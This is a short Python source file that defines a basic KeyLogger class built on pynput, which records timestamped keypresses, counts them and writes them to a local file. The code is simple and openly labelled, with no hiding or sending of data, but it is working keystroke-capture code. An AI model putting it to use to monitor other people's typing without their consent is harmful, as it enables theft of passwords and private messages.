"""
all imports necessary to carry out this process
"""
import pynput
from pynput import keyboard
from datetime import datetime
#from threading import Timer


class KeyLogger:
    """
    Class for creating keyloggers and controlling them
    """
    def __init__(self):
        """
        A keylogger stores the received input logs in a 'a_keys' list.
        """
        self.a_keys = []

        self.a_listener = keyboard.Listener(on_press=self.on_press)

    """
    fills the list with a time and the key pressed
    """
    def on_press(self,p_key):
            log = ( datetime.now().time(), p_key )
            self.a_keys.append(log)
    
    """
    return the number of keys pressed
    """
    def CountKey(self):
        count = 0
        for key in self.a_keys:
            count +=1
        return count

    """
    return the number of a given key (parameter)
    """
    def getNumKeys(self,p_key):
        numKey = 0
        for i in self.a_keys:
            if p_key in str(i[1]):
                numKey +=1
        return numKey
       
    """
    opens and fills a file with the list 'a_key'.
    """
    def write_on_file(self,p_filename):
            with open(p_filename,'w') as f:
                for key in self.a_keys:
                    f.write(str(key))
                    f.write("\n")
            f.close()
        
    """
    starts the keylogger
    """
    def start(self):
        self.a_listener.start()

    """
    stops the keylogger
    """
    def stop(self):
        self.a_listener.stop()
